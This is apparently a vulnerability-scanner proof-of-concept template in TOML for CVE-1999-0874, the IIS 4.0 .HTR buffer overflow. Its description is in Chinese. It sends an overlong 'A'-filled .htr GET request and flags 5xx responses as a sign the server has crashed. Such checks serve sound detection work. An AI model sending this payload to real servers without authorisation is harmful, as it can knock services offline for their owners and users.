[info]
author = "ave"
description = "Microsoft IIS 4.0 在处理 .HTR 扩展名的请求时存在远程缓冲区溢出漏洞（CVE-1999-0874）。攻击者可通过发送超长的畸形 .HTR 请求触发缓冲区溢出，导致服务崩溃。本 PoC 通过构造超长 URL 发送请求并检测服务器是否失去响应（拒绝服务）来验证漏洞存在。"
id = "POC-AVE-1999-1009"
name = "CVE-1999-0874 Microsoft IIS 4.0 远程缓冲区溢出 PoC"
severity = "critical"
tags = ["ave-1999-1009"]
vuln_id = [
    "CVE-1999-0874",
    "AVE-1999-1009",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.htr"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"
